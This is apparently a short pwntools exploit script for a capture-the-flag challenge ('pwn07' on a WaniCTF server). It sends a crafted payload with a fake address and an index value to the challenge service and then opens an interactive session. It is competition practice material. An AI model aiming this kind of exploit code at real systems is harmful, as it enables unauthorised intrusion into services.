from pwn import *

DEBUG = False

IP = "hanoi.pwn.wanictf.org"
PORT = 9007
BINPATH = "./pwn07"

if DEBUG:
    context.log_level = "DEBUG"
    p = process(BINPATH)
else:
    p = remote(IP, PORT)

def main():
    p.recvuntil(">")

if DEBUG:
  gdb.attach(p)

idx = 0xa7

payload = p64(0xdeadbeef) + p32(idx) 
p.sendlineafter(":", payload)

p.sendlineafter(">", "A?")

p.interactive() 
